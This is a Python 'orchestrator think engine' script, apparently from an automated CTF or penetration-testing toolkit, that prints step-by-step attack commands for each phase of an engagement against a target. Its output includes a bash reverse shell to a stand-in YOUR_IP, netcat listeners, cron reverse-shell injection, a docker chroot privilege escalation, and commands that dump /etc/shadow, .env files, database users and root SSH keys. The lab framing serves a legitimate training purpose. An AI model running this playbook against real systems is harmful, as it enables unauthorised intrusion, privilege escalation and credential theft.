#!/usr/bin/env python3
"""Orchestrator think engine — reads state, outputs next action."""
import json, sys, os

state_file = sys.argv[1] if len(sys.argv) > 1 else 'state/orchestrator.json'

with open(state_file) as f:
    s = json.load(f)

target = s['target']
phase = s['phase']
sub = s['sub_phase']
attempt = s.get('attempt', 0)
report_dir = s.get('report_dir', f'reports/{target}')

print("╔══════════════════════════════════════════════════════════════╗")
print("║  🧠 NEXT ACTION                                             ║")
print("╚══════════════════════════════════════════════════════════════╝")
print()

# ─── RECON PHASE ───────────────────────────────
if phase == 'recon':
    if sub == 'portscan':
        print(f"  📍 Phase: RECON → Port Scan")
        print(f"  🎯 Target: {target}")
        print()
        print("  RUN THIS COMMAND:")
        print(f"    nmap -sC -sV -O -A -p- --min-rate 3000 -oA {report_dir}/full-scan {target}")
        print()
        print("  THEN REPORT RESULTS:")
        print('    bash scripts/orchestrator.sh report "port 22 open SSH OpenSSH 8.9, port 80 open HTTP nginx redirect to hostname.htb"')
        print()
        print("  FORMAT: List each open port with service, version, and any redirect/hostname info")
        
    elif sub == 'udp_scan':
        print(f"  📍 Phase: RECON → UDP Scan")
        print()
        print("  RUN THIS COMMAND:")
        print(f"    nmap -sU --top-ports 50 --min-rate 2000 -oA {report_dir}/udp-scan {target}")
        print()
        print("  THEN REPORT:")
        print('    bash scripts/orchestrator.sh report "no udp services" OR')
        print('    bash scripts/orchestrator.sh report "port 161 open SNMP, port 53 open DNS"')
        
    elif sub == 'hostname_check':
        print(f"  📍 Phase: RECON → Hostname Resolution")
        hostnames = s.get('hostnames', [])
        print(f"  Hostnames found: {', '.join(hostnames)}")
        print()
        print("  RUN THESE COMMANDS:")
        for h in hostnames:
            print(f"    echo '{target} {h}' | sudo tee -a /etc/hosts")
        print()
        print("  If you don't have sudo, use Host header trick:")
        for h in hostnames:
            print(f"    curl -s -H 'Host: {h}' http://{target}/")
        print()
        print('  REPORT: bash scripts/orchestrator.sh report "hostname added" OR "no sudo, using Host header"')
        
    elif sub == 'service_enum':
        print(f"  📍 Phase: RECON → Service Enumeration")
        print()
        services = s.get('services', {})
        for port, info in services.items():
            svc = info.get('service', 'unknown')
            ver = info.get('version', '')
            print(f"  Port {port}: {svc} {ver}")
            if 'http' in svc.lower() or 'web' in svc.lower() or port in ['80', '443', '8080', '8443']:
                print(f"    → whatweb -a 3 http://{target}")
                print(f"    → curl -s http://{target} | head -50")
            elif 'smb' in svc.lower() or port in ['445', '139']:
                print(f"    → enum4linux -a {target}")
            elif 'ssh' in svc.lower():
                print(f"    → searchsploit {svc} {ver}")
            elif 'ftp' in svc.lower():
                print(f"    → ftp {target} (try anonymous)")
        print()
        print("  READ: knowledge-base/checklists/enumeration-checklist.md")
        print("  REPORT what you learned about each service")

# ─── WEB ENUMERATION PHASE ────────────────────
elif phase == 'web_enum':
    if sub == 'tech_detect':
        print(f"  📍 Phase: WEB ENUM → Technology Detection")
        hostnames = s.get('hostnames', [target])
        h = hostnames[0] if hostnames else target
        print()
        print("  RUN THESE COMMANDS:")
        print(f"    curl -s -H 'Host: {h}' http://{target}/ | head -100")
        print(f"    curl -s -H 'Host: {h}' http://{target}/robots.txt")
        print(f"    curl -s -I -H 'Host: {h}' http://{target}/")
        print()
        print("  LOOK FOR: CMS, login pages, API endpoints, interesting headers, HTML comments")
        print('  REPORT: bash scripts/orchestrator.sh report "PHP app, login at /login, API at /api, invite page at /invite"')
        
    elif sub == 'dir_bruteforce':
        print(f"  📍 Phase: WEB ENUM → Directory Bruteforce")
        hostnames = s.get('hostnames', [target])
        h = hostnames[0] if hostnames else target
        print()
        print("  RUN THIS COMMAND:")
        if hostnames and hostnames[0] != target:
            print(f"    gobuster dir -u http://{target} --add-slash -H 'Host: {h}' -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -t 30 --no-error")
        else:
            print(f"    gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -t 30 --no-error")
        print()
        print("  REPORT all interesting paths found")
        
    elif sub == 'api_enum':
        print(f"  📍 Phase: WEB ENUM → API Enumeration")
        api_paths = [p for p in s.get('web_paths', []) if 'api' in p.lower()]
        print(f"  Known API paths: {', '.join(api_paths) if api_paths else 'none yet'}")
        print()
        print("  RUN THESE:")
        for p in api_paths:
            print(f"    curl -s http://{target}{p} | python3 -m json.tool")
        print()
        print("  LOOK FOR: Admin endpoints, user management, file upload, input-accepting endpoints")
        print("  REPORT: List all endpoints and what they do")
        
    elif sub == 'vuln_scan':
        print(f"  📍 Phase: WEB ENUM → Vulnerability Scanning")
        print()
        print("  RUN THESE:")
        print(f"    nikto -h http://{target}")
        print(f"    nuclei -u http://{target} -severity critical,high")
        print()
        print("  FOR EACH SERVICE VERSION, check exploits:")
        for port, info in s.get('services', {}).items():
            ver = info.get('version', '')
            if ver:
                print(f"    searchsploit {info.get('service','')} {ver}")
        print()
        print("  REPORT all vulnerabilities found")

# ─── EXPLOITATION PHASE ───────────────────────
elif phase == 'exploit':
    if sub == 'plan':
        print(f"  📍 Phase: EXPLOIT → Plan Attack")
        print()
        print("  FINDINGS SO FAR:")
        for f in s.get('findings', []):
            print(f"    📝 {f}")
        print()
        print("  DECIDE: Which vulnerability to exploit first?")
        print("  Pick the EASIEST path to a shell:")
        print("    1. Command injection → direct RCE")
        print("    2. SQL injection → database access → creds")
        print("    3. File upload → webshell")
        print("    4. Known CVE → searchsploit/metasploit")
        print("    5. Default/weak creds → admin panel → RCE")
        print()
        print("  READ: knowledge-base/mitre-attack/techniques/web-exploitation.md")
        print('  REPORT: bash scripts/orchestrator.sh report "attacking via [method] in [endpoint]"')
        
    elif sub == 'execute':
        print(f"  📍 Phase: EXPLOIT → Execute Attack")
        attack_plan = s.get('attack_plan', 'Check findings for exploitable vulnerability')
        print(f"  PLAN: {attack_plan}")
        print()
        print("  SET UP LISTENER FIRST:")
        print("    nc -nlvp 4444")
        print()
        print("  REVERSE SHELL CHEATSHEET:")
        print("    Bash:   bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'")
        print("    Python: python3 -c 'import socket,subprocess,os;...'")
        print("    More:   cat knowledge-base/checklists/reverse-shells.md")
        print()
        print("  Get YOUR IP: ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1")
        print()
        print("  IF SHELL OBTAINED: bash scripts/orchestrator.sh report 'got shell as www-data'")
        print("  IF FAILED: bash scripts/orchestrator.sh error 'payload was filtered'")
        
    elif sub == 'stabilize':
        print(f"  📍 Phase: EXPLOIT → Stabilize Shell & Gather Info")
        print()
        print("  UPGRADE SHELL:")
        print("    python3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
        print("    Ctrl+Z → stty raw -echo; fg → export TERM=xterm")
        print()
        print("  GATHER ALL INFO (run all of these):")
        print("    whoami && id && hostname")
        print("    cat /etc/os-release")
        print("    uname -a")
        print("    cat .env 2>/dev/null")
        print("    cat /etc/passwd | grep sh$")
        print("    ls -la /home/")
        print()
        print("  REPORT: Include ALL output (users, OS version, any passwords found)")

# ─── POST-EXPLOITATION ────────────────────────
elif phase == 'postex':
    if sub == 'user_flag':
        print(f"  📍 Phase: POST-EXPLOITATION → Get User Flag")
        print()
        print("  CHECK FOR FLAGS:")
        print("    find /home -name 'user.txt' 2>/dev/null")
        print("    cat /home/*/user.txt 2>/dev/null")
        print()
        creds = s.get('credentials', [])
        if creds:
            print("  CREDENTIALS FOUND — try SSH/su:")
            for c in creds:
                if isinstance(c, dict):
                    print(f"    ssh {c.get('user','')}@{target}  # password: {c.get('pass','')}")
                    print(f"    su {c.get('user','')}")
                else:
                    print(f"    {c}")
        print()
        print("  REPORT: the flag hash and how you got it")
        
    elif sub == 'privesc_enum':
        print(f"  📍 Phase: POST-EXPLOITATION → Privilege Escalation Enumeration")
        print()
        print("  READ: playbooks/privilege-escalation.md")
        print()
        print("  RUN ALL OF THESE:")
        print("    sudo -l")
        print("    find / -perm -4000 -type f 2>/dev/null")
        print("    getcap -r / 2>/dev/null")
        print("    cat /etc/crontab && ls -la /etc/cron*")
        print("    uname -a  # check kernel version for exploits")
        print("    cat /var/mail/* 2>/dev/null  # often contains hints!")
        print("    ls -la /opt /var/backups /tmp")
        print("    env | grep -i pass")
        print("    find / -writable -type f 2>/dev/null | grep -v proc")
        print()
        print("  REPORT: everything you find (sudo, SUID, kernel version, mail hints)")
        
    elif sub == 'privesc_exploit':
        print(f"  📍 Phase: POST-EXPLOITATION → Exploit Privilege Escalation")
        privesc_vector = s.get('privesc_vector', 'unknown')
        print(f"  VECTOR DETECTED: {privesc_vector}")
        print()
        print("  COMMON PRIVESC PATHS:")
        print("    Kernel exploit → searchsploit 'linux kernel VERSION'")
        print("    sudo misconfig → check GTFOBins.github.io")
        print("    SUID binary → check GTFOBins.github.io")
        print("    Writable cron → inject reverse shell")
        print("    Docker group → docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
        print()
        print("  IF KERNEL EXPLOIT NEEDED:")
        print("    1. Check if target has gcc/make: which gcc make")
        print("    2. If no internet on target, compile locally and transfer via:")
        print(f"       scp exploit USER@{target}:/tmp/")
        print("       OR python3 -m http.server 8080 + wget on target")
        print()
        print("  REPORT: 'got root uid=0' or bash scripts/orchestrator.sh error 'exploit failed'")
        
    elif sub == 'root_flag':
        print(f"  📍 Phase: POST-EXPLOITATION → Get Root Flag")
        print()
        print("  YOU ARE ROOT. Grab everything:")
        print("    cat /root/root.txt")
        print("    cat /etc/shadow")
        print("    ls -la /root/")
        print("    cat /root/.bash_history 2>/dev/null")
        print()
        print("  REPORT: the root flag hash and any additional loot")
        
    elif sub == 'loot':
        print(f"  📍 Phase: POST-EXPLOITATION → Collect Loot")
        print()
        print("  COLLECT ALL VALUABLE DATA:")
        print("    cat /etc/shadow")
        print("    mysql -u USER -pPASS DB -e 'SELECT * FROM users' 2>/dev/null")
        print("    find / -name '*.conf' -exec grep -l 'pass' {} \\; 2>/dev/null | head -20")
        print("    cat /root/.ssh/id_rsa 2>/dev/null")
        print()
        print("  REPORT: all credentials and sensitive data found")

# ─── REPORTING PHASE ──────────────────────────
elif phase == 'report':
    print(f"  📍 Phase: REPORTING → Write Attack Report")
    print()
    print(f"  Template: templates/attack-report-template.md")
    print(f"  Output:   {report_dir}/attack-report.md")
    print()
    print("  INCLUDE IN REPORT:")
    print("  ── Findings ──")
    for f in s.get('findings', []):
        print(f"    {f}")
    print("  ── Credentials ──")
    for c in s.get('credentials', []):
        print(f"    {c}")
    print("  ── Shells ──")
    for sh in s.get('shells', []):
        print(f"    {sh}")
    print("  ── Flags ──")
    for k, v in s.get('flags', {}).items():
        print(f"    {k}: {v}")
    print()
    print('  After writing report: bash scripts/orchestrator.sh report "report written"')

elif phase == 'complete':
    print("  🎉 ENGAGEMENT COMPLETE!")
    print()
    print(f"  Report: {report_dir}/attack-report.md")
    print()
    print("  ── Final Summary ──")
    for k, v in s.get('flags', {}).items():
        print(f"    🏴 {k}: {v}")
    for c in s.get('credentials', []):
        print(f"    🔑 {c}")

else:
    print(f"  Unknown phase: {phase}/{sub}")
    print("  Run: bash scripts/orchestrator.sh status")
